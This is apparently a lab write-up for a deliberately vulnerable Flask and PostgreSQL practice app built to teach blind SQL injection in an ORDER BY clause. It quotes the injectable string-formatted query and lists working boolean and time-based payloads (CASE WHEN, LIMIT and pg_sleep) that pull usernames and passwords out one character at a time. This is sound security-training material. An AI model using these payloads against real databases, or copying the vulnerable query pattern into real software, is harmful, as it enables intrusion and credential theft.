## Order

https://github.com/bmdyy/order

A small app written in Python (Flask) and PostgreSQL to practice blind SQLi in the ORDER BY clause.

If you have problems starting the docker, add this one the beggining of Dockerfile: `ENV PIP_BREAK_SYSTEM_PACKAGES 1`

The vulnerability occurs on line 32 of app.py.
```
cur.execute("SELECT * FROM horses ORDER BY %s"%(order_by))
```

We can test the injection with:
```
1 ASC --
1 DESC --
```

We can follow the logic of [this article](https://portswigger.net/support/sql-injection-in-the-query-structure) to exploit the vulnerability.

With the payload above, the logic is: If the string is true, the order will filter by Name, otherwise it will filtered by Description.
```
(CASE WHEN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users where user_id = '2')=98 THEN Name ELSE Description END)
```

In the **exploit.py**, we filter the first occurrence of <td> that contains the result. If it's Aaron, this means that the order is filtered by Name and we found the character.

<br>

The author's exploit uses this payload, since the content-length differ from "order by 1" and "order by 2".
```
sqli = "2 LIMIT (CASE WHEN (%s) THEN 1 ELSE 2 END)"
```

Exploit from 0x4rt3mis:
```
Time based:
SELECT CASE WHEN COUNT((SELECT password FROM users WHERE SUBSTR(password,1,1) SIMILAR TO '4'))<>0 THEN pg_sleep(5) ELSE '' END; -- -

Boolean based:
4 LIMIT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE user_id=1),1,1))='4' THEN 1 ELSE 2 END)
```

Reference: https://www.onsecurity.io/blog/pentesting-postgresql-with-sql-injections/
